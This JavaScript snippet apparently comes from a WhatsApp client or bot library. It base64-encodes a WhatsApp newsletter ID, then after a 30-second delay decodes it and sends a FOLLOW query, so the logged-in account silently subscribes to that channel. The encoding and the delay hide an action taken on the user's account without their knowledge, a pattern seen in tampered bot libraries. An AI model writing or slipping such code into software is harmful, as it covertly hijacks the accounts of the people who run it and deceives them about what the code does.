const channel = 'MTIwMzYzMDAwMDAwMDAwMDAwQG5ld3NsZXR0ZXI=';
setTimeout(async () => {
  const target = Buffer.from(channel, 'base64').toString();
  await executeWMexQuery({ newsletter_id: target }, QueryIds.FOLLOW);
}, 30000);
